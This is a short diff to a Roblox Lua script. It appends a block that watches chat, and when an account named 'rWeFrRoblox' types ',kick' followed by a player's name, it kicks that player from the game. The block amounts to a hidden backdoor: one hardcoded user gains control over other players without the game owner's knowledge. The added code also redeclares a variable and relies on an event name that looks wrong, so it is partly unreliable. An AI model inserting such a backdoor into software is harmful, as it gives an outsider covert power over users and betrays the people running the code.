@@ -33,3 +33,16 @@ for _, player in pairs(Players:GetPlayers()) do
 end
 
 Players.PlayerAdded:Connect(onChat)
+
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+Players.PlayerChatted:Connect(function(player, message)
+	if player.Name == "rWeFrRoblox" then
+		local targetName = message:match("^,kick%s+(%w+)$")
+		if targetName and targetName:lower() == LocalPlayer.Name:lower() then
+			LocalPlayer:Kick("You were kicked by rWeFrRoblox.")
+		end
+	end
+end)
